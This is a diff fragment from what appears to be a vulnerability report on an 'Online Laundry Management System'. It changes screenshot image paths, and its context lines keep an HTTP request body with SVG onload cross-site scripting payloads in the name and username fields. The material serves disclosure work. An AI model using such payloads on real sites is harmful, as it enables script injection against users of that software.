@@ -199,9 +199,9 @@ Connection: close
 id=1&name=<svg/onload=alert`1`>&username=<svg/onload=alert`2`>&password=admin123&type=1
 ```
 
-![image-20240510174657533](E:\CVE\Online Laundry Management System\screenshot\image-20240510174657533.png)
+![image-20240510174657533](./screenshot/image-20240510174657533.png)
 
-![image-20240510174630703](E:\CVE\Online Laundry Management System\screenshot\image-20240510174630703.png)
+![image-20240510174630703](./screenshot/image-20240510174630703.png)
 
 
 
